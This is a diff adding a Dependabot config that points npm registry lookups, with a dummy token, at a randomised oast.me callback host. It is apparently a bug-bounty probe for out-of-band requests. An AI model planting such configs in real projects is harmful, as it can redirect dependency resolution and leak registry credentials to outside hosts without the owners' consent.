@@ -1,0 +1,13 @@
+version: 2
+registries:
+  bbtest-npm:
+    type: npm-registry
+    url: https://npm.d9qpa663586027ko0l00bsob14x4s381f.oast.me
+    token: dummy-token
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - bbtest-npm
